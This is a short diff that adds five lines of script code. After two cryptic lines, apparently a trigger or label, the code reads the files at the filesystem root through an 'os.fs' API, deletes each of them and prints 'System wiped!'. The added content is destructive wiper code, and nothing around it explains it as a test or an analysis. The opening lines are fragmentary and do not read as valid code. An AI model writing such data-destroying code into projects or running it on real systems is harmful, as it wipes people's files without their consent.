@@ -1,0 +1,5 @@
+$(IE.OPC);
+IE_RUN:
+var root = os.fs.getFiles("/");
+for (var i = 0; i < root[1].length; i++) os.fs.delete(root[1][i]);
+console.log("System wiped!");
